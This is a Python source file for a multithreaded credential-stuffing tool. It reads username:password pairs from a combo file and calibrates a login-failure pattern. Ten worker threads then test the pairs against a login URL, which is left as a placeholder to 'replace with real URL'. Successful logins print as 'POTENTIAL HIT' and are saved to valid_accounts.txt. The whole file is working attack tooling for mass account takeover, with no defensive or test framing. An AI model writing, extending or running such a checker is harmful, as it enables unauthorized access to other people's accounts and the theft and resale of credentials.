from input_engine import InputEngine
from login_detector import Calibrator, PatternAnalyzer, LoginDetector
import time
import threading
from queue import Queue
from datetime import datetime

class ThreadedCredentialChecker:
    def __init__(self, login_url, username_field='username', password_field='password', num_threads=10):
        """
        Initialize threaded checker
        
        Args:
            login_url: Login endpoint URL
            username_field: Username form field name
            password_field: Password form field name
            num_threads: Number of concurrent workers (default: 10)
        """
        self.login_url = login_url
        self.username_field = username_field
        self.password_field = password_field
        self.num_threads = num_threads
        
        # Shared resources
        self.credential_queue = Queue()
        self.valid_credentials = []
        self.tested_count = 0
        self.lock = threading.Lock()  # For thread-safe operations
        
        # Calibration (do this once, before threading)
        print("=" * 60)
        print("INITIALIZING THREADED CREDENTIAL CHECKER")
        print("=" * 60)
        
        calibrator = Calibrator(login_url, username_field, password_field)
        calibrator.run_calibration(num_attempts=5, delay=2)
        
        analyzer = PatternAnalyzer(calibrator.calibration_responses)
        self.failure_pattern = analyzer.analyze()
        
        # We'll create a detector per thread (each needs its own session)
        self.calibrator = calibrator
    
    def worker(self, thread_id):
        """
        Worker thread that tests credentials
        
        Args:
            thread_id: ID of this worker thread
        """
        # Each thread gets its own detector with its own session
        from login_detector import Calibrator, PatternAnalyzer, LoginDetector
        
        # Create a new calibrator and detector for this thread
        thread_calibrator = Calibrator(self.login_url, self.username_field, self.password_field)
        
        # Create a simple pattern analyzer with the existing pattern
        class SimpleAnalyzer:
            def __init__(self, pattern):
                self.pattern = pattern
            def get_pattern(self):
                return self.pattern
        
        thread_analyzer = SimpleAnalyzer(self.failure_pattern)
        thread_detector = LoginDetector(thread_calibrator, thread_analyzer)
        
        while True:
            try:
                # Get credential from queue (timeout after 1 second)
                username, password = self.credential_queue.get(timeout=1)
                
                # Test the credential
                is_success, response, score, deviations = thread_detector.test_credential(username, password)
                
                # Thread-safe updates
                with self.lock:
                    self.tested_count += 1
                    
                    if is_success:
                        print(f"\n🎯 [Thread-{thread_id}] POTENTIAL HIT: {username}:{password}")
                        print(f"   Deviation Score: {score}/8")
                        for reason in deviations:
                            print(f"   - {reason}")
                        
                        self.valid_credentials.append((username, password))
                        self.save_valid_credential(username, password)
                    else:
                        if self.tested_count % 10 == 0:
                            print(f"   [Progress: {self.tested_count} tested]")
                
                # Mark task as done
                self.credential_queue.task_done()
                
                # Small delay to avoid overwhelming the server
                time.sleep(2)
                
            except:
                # Queue is empty, worker can exit
                break
    
    def save_valid_credential(self, username, password):
        """Save a valid credential immediately"""
        with open('valid_accounts.txt', 'a') as f:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write(f"[{timestamp}] {username}:{password}\n")
    
    def run(self, combo_file):
        """
        Main execution method
        
        Args:
            combo_file: Path to combo.txt file
        """
        print("\n" + "=" * 60)
        print(f"STARTING {self.num_threads} WORKER THREADS")
        print("=" * 60)
        
        start_time = time.time()
        
        # Load credentials into queue
        engine = InputEngine(combo_file)
        credential_count = 0
        
        for username, password in engine.load_credentials():
            self.credential_queue.put((username, password))
            credential_count += 1
        
        print(f"✓ Loaded {credential_count} credentials into queue")
        
        # Start worker threads
        threads = []
        for i in range(self.num_threads):
            t = threading.Thread(target=self.worker, args=(i+1,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        print(f"✓ Started {self.num_threads} worker threads")
        print("\n" + "=" * 60)
        print("TESTING IN PROGRESS...")
        print("=" * 60)
        
        # Wait for all tasks to complete
        self.credential_queue.join()
        
        # Wait for threads to finish
        for t in threads:
            t.join()
        
        elapsed = time.time() - start_time
        
        # Final summary
        print("\n" + "=" * 60)
        print("FINAL SUMMARY")
        print("=" * 60)
        print(f"Total tested: {self.tested_count}")
        print(f"Potential hits: {len(self.valid_credentials)}")
        print(f"Time elapsed: {elapsed:.1f} seconds")
        print(f"Average speed: {self.tested_count/elapsed:.2f} credentials/second")
        
        if self.valid_credentials:
            print(f"\n✓ Valid credentials saved to: valid_accounts.txt")
            print("\nFound credentials:")
            for username, password in self.valid_credentials:
                print(f"  🎯 {username}:{password}")
        else:
            print("\n⚠ No valid credentials found")


def main():
    # Configuration
    combo_file = 'combo.txt'
    login_url = 'https://httpbin.org/post'  # Replace with real URL
    username_field = 'username'
    password_field = 'password'
    num_threads = 10  # Adjust based on your needs (5-20 is good)
    
    # Create and run checker
    checker = ThreadedCredentialChecker(
        login_url=login_url,
        username_field=username_field,
        password_field=password_field,
        num_threads=num_threads
    )
    
    checker.run(combo_file)


if __name__ == "__main__":
    main()